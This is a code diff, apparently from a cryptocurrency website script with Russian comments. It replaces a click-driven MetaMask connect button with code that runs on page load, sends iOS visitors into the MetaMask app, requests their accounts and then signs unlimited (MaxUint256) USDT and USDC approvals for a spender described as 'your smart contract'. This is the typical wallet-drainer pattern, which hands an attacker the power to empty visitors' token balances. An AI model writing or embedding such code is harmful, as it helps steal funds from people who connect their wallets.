@@ -681,66 +681,53 @@
 // Функция для кодирования URL без проблемных символов
 // Полный рабочий код для подключения MetaMask на iOS
 // Функция для безопасного открытия MetaMask на iOS
-document.addEventListener("DOMContentLoaded", function () {
+(async function () {
   const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
-  const connectBtn = document.querySelector(".connect-btn");
+  const dappUrl = encodeURIComponent(window.location.origin);
+  const metamaskLink = `https://metamask.app.link/dapp/${dappUrl}`;
 
-  async function connectMetaMask() {
-    if (typeof window.ethereum === 'undefined') {
-      alert("MetaMask не установлен.");
-      return;
-    }
-
-    try {
-      // Запрашиваем доступ к аккаунтам
-      const accounts = await window.ethereum.request({
-        method: "eth_requestAccounts",
-      });
-
-      // Сразу запрашиваем разрешения (approve)
-      await window.ethereum.request({
-        method: "wallet_requestPermissions",
-        params: [{ eth_accounts: {} }]
-      });
-
-      console.log("Connected account:", accounts[0]);
-      connectBtn.textContent = "Connected!";
-    } catch (error) {
-      console.error("Ошибка при подключении:", error);
-      connectBtn.textContent = "Ошибка. Попробуй снова.";
-    }
+  // Если зашёл с iOS не через MetaMask — редиректим туда
+  if (isIOS && !window.ethereum?.isMetaMask) {
+    window.location.href = metamaskLink;
+    return;
   }
 
-  connectBtn.addEventListener("click", async function (e) {
-    e.preventDefault();
-    connectBtn.disabled = true;
-    connectBtn.textContent = "Connecting...";
+  // Ждём, пока MetaMask прогрузится
+  await new Promise(res => setTimeout(res, 1000));
 
-    if (isIOS) {
-      // Открываем MetaMask через universal link
-      const dappUrl = encodeURIComponent(window.location.origin);
-      const metamaskLink = `https://metamask.app.link/dapp/${dappUrl}`;
-      window.location.href = metamaskLink;
+  if (typeof window.ethereum !== 'undefined') {
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    try {
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const user = await signer.getAddress();
 
-      // Ждём 1 секунду, потом пытаемся подключиться
-      setTimeout(async () => {
-        await connectMetaMask();
-      }, 1000);
-    } else {
-      await connectMetaMask();
+      console.log("Wallet connected:", user);
+
+      // Примеры approve (можешь дублировать для других токенов)
+      const tokens = [
+        {
+          address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
+          spender: "0x0000000000000000000000000000000000000000" // твой смарт-контракт
+        },
+        {
+          address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
+          spender: "0x0000000000000000000000000000000000000000"
+        }
+      ];
+
+      const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
+
+      for (let token of tokens) {
+        const contract = new ethers.Contract(token.address, abi, signer);
+        const tx = await contract.approve(token.spender, ethers.constants.MaxUint256);
+        console.log(`Approve sent for ${token.address}: ${tx.hash}`);
+      }
+
+    } catch (e) {
+      console.error("Error during approve:", e);
     }
-
-    connectBtn.disabled = false;
-  });
-
-  // Touchstart для iOS (иначе Safari может игнорировать клик)
-  connectBtn.addEventListener("touchstart", function (e) {
-    e.preventDefault();
-    const clickEvent = new MouseEvent("click", {
-      bubbles: true,
-      cancelable: true,
-      view: window,
-    });
-    this.dispatchEvent(clickEvent);
-  }, { passive: false });
-});
+  } else {
+    console.log("MetaMask not detected");
+  }
+})();
